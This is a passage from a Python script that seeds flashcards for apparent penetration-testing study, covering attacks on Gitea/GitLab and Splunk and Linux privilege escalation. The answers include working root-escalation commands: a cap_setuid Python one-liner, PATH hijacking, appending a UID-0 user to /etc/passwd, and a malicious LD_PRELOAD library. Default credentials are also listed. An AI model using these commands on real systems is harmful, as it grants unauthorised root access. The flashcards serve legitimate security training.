{"module_id":23,"question":"What is the primary attack vector on exposed Gitea/GitLab instances?","answer":"1. Default credentials (root:root, root:password, admin:admin). 2. Public repositories with secrets (API keys, credentials in code). 3. Git history (deleted credentials persist in commits). 4. Known CVE for the specific version (check searchsploit + ExploitDB). 5. SSRF via webhook configuration if available.","tags":["gitea","gitlab","methodology"]},
{"module_id":23,"question":"What Splunk feature can be abused for RCE?","answer":"Splunk's custom search command feature allows Python scripts. With admin access: create a custom app with a Python search command that executes OS commands. Also: Splunk forwarder deployment allows pushing apps to managed forwarders. Known CVEs include authentication bypass in older versions. Default creds: admin:changeme.","tags":["splunk","rce","post-exploitation"]},

# Module 24 – Linux PrivEsc
{"module_id":24,"question":"What is the first command to run on a Linux shell for privilege escalation?","answer":"sudo -l — shows what commands the current user can run with sudo and as which user. A single misconfigured sudo entry with a GTFOBins escape = instant root. This takes 1 second and succeeds surprisingly often. Always run before any automated tool.","tags":["linux-privesc","sudo","methodology"]},
{"module_id":24,"question":"What is linPEAS and what does it check?","answer":"linPEAS (Linux Privilege Escalation Awesome Script) is automated enumeration for Linux privilege escalation. Checks: SUID/SGID, sudo, cron, writable paths, capabilities, PATH injection, NFS mounts, /etc/passwd writability, kernel version, running processes, network config, and installed software. Output colour-coded: red=high priority, yellow=interesting.","tags":["linux-privesc","linpeas","enumeration"]},
{"module_id":24,"question":"What is pspy and why is it useful for privilege escalation?","answer":"pspy monitors running processes without root privileges by reading /proc. It shows processes as they spawn — including cron jobs run by root that don't appear in crontab -l (because they're in /etc/cron.d/ or system crontabs). Run for 2-3 minutes to capture all cron activity: ./pspy64 -pf -i 1000","tags":["linux-privesc","pspy","cron"]},
{"module_id":24,"question":"What is the GTFOBins website and when is it used?","answer":"gtfobins.github.io — catalogue of Unix binaries with known privilege escalation paths for SUID, sudo, and capability abuse. For every unusual SUID binary or sudo-allowed command, search GTFOBins for the exact escalation command. Categories: sudo, suid, capabilities, shell, file-read, file-write, etc.","tags":["linux-privesc","gtfobins","suid"]},
{"module_id":24,"question":"What Linux capability enables privilege escalation and how do you find it?","answer":"getcap -r / 2>/dev/null lists file capabilities. Dangerous capabilities: cap_setuid (set UID to any user including root), cap_net_raw (raw packet sending — not direct privesc), cap_dac_read_search (bypass file permission checks — read any file). Example: python3 with cap_setuid: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'","tags":["linux-privesc","capabilities","getcap"]},
{"module_id":24,"question":"What is PATH hijacking for privilege escalation?","answer":"If a SUID binary or cron script calls another program without full path (e.g., finds instead of /usr/bin/find), create a malicious 'finds' in a directory you control that appears first in PATH. export PATH=/tmp:$PATH; echo '/bin/bash -p' > /tmp/finds; chmod +x /tmp/finds. When the SUID runs 'finds', it executes your version with SUID privileges.","tags":["linux-privesc","path-hijacking","suid"]},
{"module_id":24,"question":"What makes /etc/passwd writable exploitable for privilege escalation?","answer":"Adding a new entry with UID:GID 0:0 creates a root-equivalent user without requiring /etc/shadow. Format: username:HASH:0:0::/root:/bin/bash. Generate hash: openssl passwd -1 password. The new user's credentials provide root shell via su. Verify writability: ls -la /etc/passwd → should show -rw-rw-rw- or -rw-rw-r--.","tags":["linux-privesc","etc-passwd","password-hash"]},
{"module_id":24,"question":"What is NFS no_root_squash and how is it exploited?","answer":"NFS exports with no_root_squash allow the client's root user to act as root on the NFS share. Enumerate: cat /etc/exports. If no_root_squash is set on an exported directory: mount on attacker as root, create a SUID bash binary. When the victim (non-root) runs the SUID bash, it runs as root on the victim machine.","tags":["linux-privesc","nfs","no-root-squash"]},
{"module_id":24,"question":"What is LD_PRELOAD privilege escalation?","answer":"LD_PRELOAD is an environment variable that loads a shared library before all others. If sudo preserves LD_PRELOAD (env_keep+=LD_PRELOAD), create a malicious .so: #include <unistd.h> void _init(){setuid(0);system(\"/bin/bash\");}. Compile: gcc -shared -fPIC -o /tmp/evil.so evil.c. Then: sudo LD_PRELOAD=/tmp/evil.so [allowed-command].","tags":["linux-privesc","ld-preload","sudo"]},
{"module_id":24,"question":"What kernel exploit methodology is used for Linux privilege escalation?","answer":"Last resort only — kernel exploits crash systems and leave forensics artifacts. Methodology: uname -r (get kernel version) → searchsploit linux kernel [version] → check CVE (DirtyPipe CVE-2022-0847 for 5.8-5.16.11, DirtyCow CVE-2016-5195 for < 4.8.3) → compile and run in /tmp. Always exhaust misconfig paths first.","tags":["linux-privesc","kernel","dirty-pipe"]},
]

for fc in new_flashcards:
    if fc['question'] not in existing_questions:
        flashcards_expanded.append(fc)
        existing_questions.add(fc['question'])

save('flashcards-expanded.json', flashcards_expanded)
print(f"flashcards-expanded.json: {len(flashcards_expanded)} total entries")
print("\nDone! Modules 12-24 seeded.")
